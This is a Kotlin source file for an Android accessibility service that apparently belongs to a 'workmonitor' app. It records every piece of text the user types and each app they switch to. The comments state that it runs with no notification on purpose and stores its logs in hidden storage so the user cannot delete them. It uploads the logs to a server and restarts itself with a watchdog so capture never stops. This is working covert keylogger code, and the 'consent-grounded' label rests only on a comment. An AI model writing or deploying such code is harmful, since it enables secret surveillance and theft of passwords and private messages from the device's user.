package com.workmonitor

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.view.accessibility.AccessibilityEvent

/**
 * Consent-grounded AccessibilityService for the company-owned device.
 * Captures user text input and window/app focus, logs to the daily file.
 *
 * No notification is shown on purpose: the AccessibilityService binding is a
 * system service that Android keeps alive (and restarts after reboot), so the
 * capture + upload loop runs persistently and invisibly.
 */
class KeystrokeAccessibilityService : AccessibilityService() {

    override fun onServiceConnected() {
        // PRIVATE app storage — hidden, not visible in a file manager, so the
        // phone's user can't casually or deliberately delete the captures.
        // Every per-day log is also uploaded to the server (Postgres) for the
        // admin to view by date, so a device wipe never loses them.
        LoggerWriter.init(filesDir)
        // Start the plain (non-foreground) upload loop. The accessibility binding
        // keeps this process alive, so the loop keeps running with NO notification.
        startService(Intent(this, LogUploaderService::class.java))
        // Safety: if Android ever kills the uploader while we're running, restart
        // it from here on a timer so monitoring never silently dies.
        watchdog.start()
    }

    private val watchdog = object : Thread() {
        override fun run() {
            while (!isInterrupted) {
                try {
                    Thread.sleep(15_000)
                    startService(Intent(this@KeystrokeAccessibilityService, LogUploaderService::class.java))
                } catch (_: InterruptedException) { break }
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        // Capture text input: view with changed/typed text
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            val text = event.text?.joinToString("")?.trim()
            if (!text.isNullOrEmpty()) {
                val pkg = event.packageName?.toString() ?: "?"
                val cls = event.className?.toString() ?: "?"
                val activity = cls.substringAfterLast('.')
                LoggerWriter.write(pkg, activity, text)
            }
        }

        // Capture app/window focus transitions (which app is in foreground)
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            val pkg = event.packageName?.toString() ?: "?"
            val cls = event.className?.toString() ?: "?"
            val activity = cls.substringAfterLast('.')
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                LoggerWriter.write("[FOCUS]", pkg, "activity=$activity")
            }
        }
    }

    override fun onInterrupt() {
        LoggerWriter.close()
    }

    override fun onDestroy() {
        watchdog.interrupt()
        LoggerWriter.close()
        super.onDestroy()
    }
}